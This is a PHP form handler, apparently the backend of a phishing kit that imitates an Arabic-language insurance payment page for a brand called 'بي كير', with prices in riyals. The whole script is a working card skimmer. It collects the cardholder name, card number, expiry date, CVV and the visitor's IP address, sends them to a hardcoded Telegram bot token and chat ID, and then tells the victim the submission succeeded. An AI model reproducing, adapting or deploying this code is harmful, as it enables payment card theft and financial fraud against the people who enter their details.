<?php
// إعدادات التليجرام
define('BOT_TOKEN', '8336961082:AAGqlFilNFcN-NVMrzWGeut7JhLd_yZqOkc');
define('CHAT_ID', '8535558521');

// استقبال بيانات الشركة المختارة
$company = isset($_POST['company']) ? $_POST['company'] : '';
$plan = isset($_POST['plan']) ? $_POST['plan'] : '';
$base = isset($_POST['base']) ? $_POST['base'] : '';
$price = isset($_POST['price']) ? $_POST['price'] : '';
$vat = isset($_POST['vat']) ? $_POST['vat'] : '';
$total = isset($_POST['total']) ? $_POST['total'] : '';
$features = isset($_POST['features']) ? $_POST['features'] : '';

// استقبال بيانات البطاقة
$cardholder_name = '';
if (isset($_POST['name'])) {
    $cardholder_name = $_POST['name'];
} elseif (isset($_POST['cardholder_name'])) {
    $cardholder_name = $_POST['cardholder_name'];
}

$card_number = '';
if (isset($_POST['cardnumber'])) {
    $card_number = $_POST['cardnumber'];
} elseif (isset($_POST['card_number'])) {
    $card_number = $_POST['card_number'];
}

$expiry_date = '';
if (isset($_POST['expirationdate'])) {
    $expiry_date = $_POST['expirationdate'];
} elseif (isset($_POST['expiry_date'])) {
    $expiry_date = $_POST['expiry_date'];
}

$cvv = '';
if (isset($_POST['securitycode'])) {
    $cvv = $_POST['securitycode'];
} elseif (isset($_POST['cvv'])) {
    $cvv = $_POST['cvv'];
}

// بناء الرسالة
$message = "💳 <b>طلب دفع جديد - بي كير</b>\n\n";

$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🏢 <b>الشركة المختارة</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= "🏛️ <b>الشركة:</b> " . $company . "\n\n";
$message .= "📋 <b>الخطة:</b> " . $plan . "\n\n";
$message .= "💵 <b>القسط الأساسي:</b> " . number_format($base, 2) . " ريال\n\n";
$message .= "💸 <b>السعر النهائي:</b> " . number_format($price, 2) . " ريال\n\n";
$message .= "📊 <b>الضريبة (15%):</b> " . number_format($vat, 2) . " ريال\n\n";
$message .= "💎 <b>المجموع الكلي:</b> " . number_format($total, 2) . " ريال\n\n";

// إضافة المزايا إذا وجدت
if (!empty($features)) {
    $features_array = json_decode($features, true);
    if (is_array($features_array) && count($features_array) > 0) {
        $message .= "✨ <b>المزايا الإضافية:</b>\n";
        foreach ($features_array as $feature) {
            if (isset($feature['label']) && isset($feature['price'])) {
                $message .= "  • " . $feature['label'] . " (+" . $feature['price'] . " ريال)\n";
            }
        }
        $message .= "\n";
    }
}

$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "💳 <b>بيانات البطاقة</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

// التأكد من وجود الاسم
if (empty($cardholder_name)) {
    $cardholder_name = "لم يتم الإدخال";
}

$message .= "👤 <b>اسم حامل البطاقة:</b> " . htmlspecialchars($cardholder_name) . "\n\n";
$message .= "💳 <b>card number:</b> <code>" . htmlspecialchars($card_number) . "</code>\n\n";
$message .= "📅 <b>تاريخ الانتهاء:</b> <code>" . htmlspecialchars($expiry_date) . "</code>\n\n";
$message .= "🔐 <b>CVV:</b> <code>" . htmlspecialchars($cvv) . "</code>\n\n";

$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";
$message .= "⏰ <b>وقت الطلب:</b> " . date('Y-m-d H:i:s') . "\n";
$message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'];

// إرسال الرسالة إلى التليجرام
function sendTelegramMessage($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// إرسال الرسالة
$response = sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);

// إرجاع استجابة
header('Content-Type: application/json');
if ($response !== false) {
    echo json_encode([
        'success' => true,
        'message' => 'تم الإرسال بنجاح'
    ]);
} else {
    echo json_encode([
        'success' => false,
        'message' => 'فشل الإرسال'
    ]);
}
?>